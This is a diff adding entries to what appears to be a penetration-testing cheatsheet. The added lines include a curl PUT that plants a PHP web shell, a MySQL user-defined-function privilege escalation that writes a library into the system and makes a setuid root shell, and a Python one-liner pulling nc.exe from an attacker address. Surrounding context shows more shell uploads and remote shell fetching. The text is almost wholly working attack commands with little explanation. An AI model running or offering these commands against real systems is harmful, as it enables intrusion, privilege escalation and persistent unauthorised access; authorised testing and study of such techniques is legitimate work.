@@ -162,6 +162,11 @@ curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --coo
 curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
 ```
 
+#### PUTing File on the Webhost via PUT verb
+```bash
+curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.2.99/shell.php
+```
+
 #### Generating Payload Pattern & Calculating Offset
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
@@ -276,6 +281,21 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 # We're interested in modules without protection, Read & Execute permissions
 !mona modules
 ```
+##### MySQL User Defined Fuction Privilge Escalation
+Requires [raptor_udf2.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor_udf2.c) and [sid-shell.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/sid-shell.c)
+
+```
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+```mysql
+use mysql;
+create table npn(line blob);
+insert into npn values(load_file('/tmp/raptor_udf2.so'));
+select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');
+```
 
 ##### Finding JMP ESP Address
 ```
@@ -328,6 +348,11 @@ ftp -s:ftp-commands.txt
 ##### PHP
 ```php
 <?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
+```
+
+##### Python
+```python
+python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
 ```
 
 ##### HTTP: Powershell
@@ -500,6 +525,11 @@ find /etc -iname *.conf
 ```
 
 ## Post-Exploitation & Maintaining Access
+
+#### Browsing Registry Hives
+```bash
+hivesh /registry/file
+```
 
 #### Decrypting VNC Password
 ```bash
